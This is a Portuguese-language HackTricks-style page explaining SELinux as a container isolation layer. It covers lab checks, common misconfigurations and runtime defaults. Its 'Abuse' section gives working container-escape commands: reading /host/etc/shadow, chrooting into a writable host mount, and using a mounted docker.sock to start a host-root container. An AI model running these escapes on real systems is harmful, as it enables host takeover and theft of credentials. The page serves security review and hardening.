# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Visão geral

SELinux é um **sistema de Controle de Acesso Obrigatório baseado em rótulos**. Todo processo e objeto relevantes podem portar um contexto de segurança, e a política decide quais domínios podem interagir com quais tipos e de que maneira. Em ambientes containerizados, isso normalmente significa que o runtime lança o processo do container sob um domínio confinado do container e rotula o conteúdo do container com tipos correspondentes. Se a política estiver funcionando corretamente, o processo poderá ler e gravar as coisas que seu rótulo deveria tocar enquanto tem acesso negado a outros conteúdos do host, mesmo que esse conteúdo fique visível por meio de um mount.

Esta é uma das proteções no lado do host mais poderosas disponíveis em implantações mainstream de containers Linux. É especialmente importante no Fedora, RHEL, CentOS Stream, OpenShift e outros ecossistemas centrados em SELinux. Nesses ambientes, um revisor que ignora o SELinux frequentemente entenderá mal por que um caminho que parece óbvio para comprometer o host está, na verdade, bloqueado.

## AppArmor vs SELinux

A diferença de alto nível mais simples é que o AppArmor é baseado em caminhos (path-based), enquanto o SELinux é **baseado em rótulos**. Isso tem grandes consequências para a segurança de containers. Uma política baseada em caminhos pode se comportar de forma diferente se o mesmo conteúdo do host ficar visível sob um caminho de mount inesperado. Uma política baseada em rótulos, por outro lado, pergunta qual é o rótulo do objeto e o que o domínio do processo pode fazer com ele. Isso não torna o SELinux simples, mas o torna robusto contra uma classe de suposições envolvendo truques de caminho que os defensores às vezes fazem acidentalmente em sistemas baseados em AppArmor.

Como o modelo é orientado a rótulos, o manuseio de volumes de container e as decisões de re-etiquetagem são críticas para a segurança. Se o runtime ou operador alterar rótulos de forma muito ampla para "fazer os mounts funcionarem", o limite da política que deveria conter a carga de trabalho pode ficar muito mais fraco do que o pretendido.

## Laboratório

Para verificar se o SELinux está ativo no host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Para inspecionar os labels existentes no host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Para comparar uma execução normal com uma em que a rotulagem está desativada:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Em um host com SELinux habilitado, esta é uma demonstração muito prática porque mostra a diferença entre uma carga de trabalho executando sob o domínio do container esperado e outra que foi privada dessa camada de aplicação de políticas.

## Runtime Usage

Podman se alinha particularmente bem com SELinux em sistemas onde SELinux faz parte do padrão da plataforma. Rootless Podman combinado com SELinux é uma das bases de container mais fortes e mais usadas porque o processo já é não-privilegiado no lado do host e ainda é confinado por política MAC. Docker também pode usar SELinux onde suportado, embora administradores às vezes o desativem para contornar problemas de rotulagem de volumes. CRI-O e OpenShift dependem fortemente de SELinux como parte de sua abordagem de isolamento de containers. Kubernetes também pode expor configurações relacionadas ao SELinux, mas seu valor depende obviamente de o sistema operacional do node realmente suportar e aplicar SELinux.

A lição recorrente é que SELinux não é um enfeite opcional. Nos ecossistemas construídos ao seu redor, ele faz parte da fronteira de segurança esperada.

## Misconfigurations

O erro clássico é `label=disable`. Operacionalmente, isso frequentemente acontece porque um mount de volume foi negado e a resposta de curto prazo mais rápida foi remover SELinux da equação em vez de corrigir o modelo de rotulagem. Outro erro comum é a re-rotulagem incorreta do conteúdo do host. Operações amplas de re-rotulagem podem fazer a aplicação funcionar, mas também podem expandir o que o container tem permissão para tocar muito além do originalmente pretendido.

Também é importante não confundir SELinux **instalado** com SELinux **efetivo**. Um host pode suportar SELinux e ainda estar em modo permissive, ou o runtime pode não estar iniciando a carga de trabalho sob o domínio esperado. Nesses casos a proteção é bem mais fraca do que a documentação pode sugerir.

## Abuse

Quando SELinux está ausente, em modo permissive, ou amplamente desativado para a carga de trabalho, caminhos montados do host tornam-se muito mais fáceis de abusar. O mesmo bind mount que, de outra forma, teria sido restringido por rótulos pode se tornar uma via direta para dados do host ou modificação do host. Isso é especialmente relevante quando combinado com mounts de volumes graváveis, diretórios do container runtime ou atalhos operacionais que expuseram caminhos sensíveis do host por conveniência.

SELinux frequentemente explica por que um generic breakout writeup funciona imediatamente em um host mas falha repetidamente em outro mesmo que as runtime flags pareçam similares. O ingrediente faltante frequentemente não é um namespace ou uma capability, mas uma fronteira de rótulos que permaneceu intacta.

A verificação prática mais rápida é comparar o contexto ativo e então sondar caminhos montados do host ou diretórios do runtime que normalmente seriam confinados por rótulos:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Se um bind mount do host estiver presente e a rotulagem do SELinux tiver sido desativada ou enfraquecida, a exposição de informações geralmente ocorre primeiro:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Se o mount for gravável e o container for efetivamente host-root do ponto de vista do kernel, o próximo passo é testar modificações controladas no host em vez de adivinhar:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Em hosts com suporte a SELinux, a perda de rótulos em diretórios de estado em tempo de execução também pode expor caminhos diretos de privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Esses comandos não substituem uma cadeia de escape completa, mas deixam bem claro muito rapidamente se SELinux era o que estava impedindo o acesso a dados do host ou a modificação de arquivos no host.

### Exemplo Completo: SELinux Desativado + Montagem do Host Gravável

Se a rotulagem do SELinux estiver desativada e o sistema de arquivos do host estiver montado como gravável em `/host`, uma fuga completa para o host se torna um caso normal de abuso de bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Se o `chroot` tiver sucesso, o processo do container agora está operando a partir do sistema de arquivos do host:
```bash
id
hostname
cat /etc/passwd | tail
```
### Exemplo completo: SELinux Desativado + Diretório de Runtime

Se a workload conseguir alcançar um runtime socket depois que os labels forem desativados, o escape pode ser delegado ao runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
A observação relevante é que o SELinux frequentemente era o controle que impedia exatamente esse tipo de acesso a host-path ou runtime-state.

## Verificações

O objetivo das verificações de SELinux é confirmar que o SELinux está habilitado, identificar o contexto de segurança atual e verificar se os arquivos ou caminhos que lhe interessam estão realmente confinados por rótulos.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
O que é interessante aqui:

- `getenforce` should ideally return `Enforcing`; `Permissive` or `Disabled` changes the meaning of the whole SELinux section.
- Se o contexto do processo atual parecer inesperado ou amplo demais, a workload pode não estar executando sob a política de contêiner pretendida.
- Se arquivos montados do host ou diretórios de runtime tiverem rótulos que o processo possa acessar com muita liberdade, bind mounts tornam-se muito mais perigosos.

Ao revisar um contêiner em uma plataforma com suporte a SELinux, não trate a rotulagem como um detalhe secundário. Em muitos casos é uma das principais razões pelas quais o host ainda não está comprometido.

## Padrões de runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Host-dependent | SELinux separation is available on SELinux-enabled hosts, but the exact behavior depends on host/daemon configuration | `--security-opt label=disable`, re-rotulagem ampla de bind mounts, `--privileged` |
| Podman | Commonly enabled on SELinux hosts | A separação SELinux é parte normal do Podman em sistemas com SELinux, a menos que esteja desabilitada | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Not generally assigned automatically at Pod level | O suporte a SELinux existe, mas os Pods normalmente precisam de `securityContext.seLinuxOptions` ou padrões específicos da plataforma; suporte do runtime e do node é necessário | seLinuxOptions fracos ou amplos, execução em nodes permissive/disabled, políticas de plataforma que desativam a rotulagem |
| CRI-O / OpenShift style deployments | Commonly relied on heavily | O SELinux costuma ser parte central do modelo de isolamento de nodes nesses ambientes | políticas customizadas que ampliam excessivamente o acesso, desabilitar rotulagem por compatibilidade |

Os padrões do SELinux dependem mais da distribuição do que os padrões do seccomp. Em sistemas estilo Fedora/RHEL/OpenShift, o SELinux costuma ser central para o modelo de isolamento. Em sistemas sem SELinux, ele simplesmente está ausente.
{{#include ../../../../banners/hacktricks-training.md}}
